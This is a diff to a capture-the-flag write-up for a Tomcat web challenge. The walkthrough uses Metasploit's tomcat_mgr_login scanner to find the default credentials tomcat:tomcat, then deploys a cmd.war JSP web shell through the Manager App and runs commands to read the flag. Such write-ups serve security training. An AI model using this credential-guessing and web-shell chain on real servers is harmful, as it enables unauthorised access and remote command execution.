@@ -3,9 +3,9 @@
 ## Web: 90 Points
 
 ## Challenge
-We're using Tomcat to manage our challenges.laptophackingcoffee.org server. Is that bad?
+We're using Tomcat to manage our [challenges.laptophackingcoffee.org](challenges.laptophackingcoffee.org) server. Is that bad?
 
-(Note: The server resets to default every 30 minutes. All progress will be lost.)
+Note: The server resets to default every 30 minutes. All progress will be lost.
 
 ## Solution
 
@@ -88,7 +88,7 @@ Matching Modules
 ...
 ```
 
-Out of the search results, the `auxiliary/scanner/http/tomcat_mgr_login` (#8) looks like the most relevant exploit. Select the exploit (`use 8`). Use the `info` and `show options` commands to view more details about the exploit. 
+Out of the search results, the `auxiliary/scanner/http/tomcat_mgr_login` (#8) looks like the most relevant exploit. Select the exploit by entering the command `use 8`. Use the `info` and `show options` commands to view more details about the exploit. 
 
 ```
 msf5 > use 8
@@ -120,7 +120,7 @@ Module options (auxiliary/scanner/http/tomcat_mgr_login):
    VHOST                                                                                             no        HTTP server virtual host
 ```
 
-Note that the `RPORT` is already set to 8080. Set the `RHOSTS` option to the LHC website and run the exploit:
+Note that the `RPORT` is already set to port 8080. Set the `RHOSTS` option to the LHC website and run the exploit:
 ```
 msf5 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS challenges.laptophackingcoffee.org
 RHOSTS => challenges.laptophackingcoffee.org
@@ -141,7 +141,7 @@ The exploit succeeded! Login successful:
 [+] 35.237.149.50:8080 - Login Successful: tomcat:tomcat
 ```
 
-Visit the Tomcat page and login with these credentials. 
+Visit the Tomcat Manager App page and login with these credentials:
 ```
 user:     tomcat
 password: tomcat
@@ -150,25 +150,35 @@ password: tomcat
 Access granted: 
 ![screenshot3.png](screenshot3.png)
 
-The page has a very alluring **Deploy** section. It allows users to **Select WAR file to upload** and then click the **Deploy** button. Further [research][1] confirms that this capability is dangerous. One of the [ways][3] to exploit this is through a web shell. Download the [cmd.war](cmd.war) file from this [github repo][4]. Upload and deploy it to the manager page.
+The page has a very alluring **Deploy** section. It allows users to **Select WAR file to upload** and then click the **Deploy** button. Further [research][1] confirms that this capability is dangerous. One of the [ways][3] to exploit this is through a web shell. 
 
-There will be a path called `/cmd`. 
+Download the [cmd.war](cmd.war) file from this [github repo][4]. Upload and deploy it to the manager page. There will be a link named [/cmd](http://challenges.laptophackingcoffee.org:8080/cmd/). However, this link returns a **404 Not Found** status. To access the shell, visit the `/cmd/cmd.jsp` path:
 
 http://challenges.laptophackingcoffee.org:8080/cmd/cmd.jsp
 
+The **Commands with JSP** page will appear. Type any command in the text field and click **Send** to execute it. The `ls` command gives these results. One of the files is **flag.txt**:
+
+![screenshot4.png](screenshot4.png)
+
+Cat the **flag.txt** file and grab the flag:
+
+![screenshot5.png](screenshot5.png)
+
 ```
 LHC{T0Mc@t_D3F@ult}
-
 ```
-
 
 ## Resources
 * [HackTheBox Writeup - Jerry][1]
 * [GitHub: Apache Tomcat Default Credentials][2]
 * [Multiple Ways to Exploit Tomcat Manager][3]
 * [GitHub: Web Shells][4]
+* [YouTube: Tomcat Server Shells][5]
+* [PentesterLab: CVE-2007-1860 Exercise][6]
 
 [1]:https://medium.com/@hussaini.faisal/hackthebox-writeup-jerry-aa2b992917a7
 [2]:https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
 [3]:https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
 [4]:https://github.com/jbarcia/Web-Shells/blob/master/laudanum/jsp/cmd.war
+[5]:https://youtu.be/825BP_gq6xo
+[6]:https://pentesterlab.com/exercises/cve-2007-1860/course
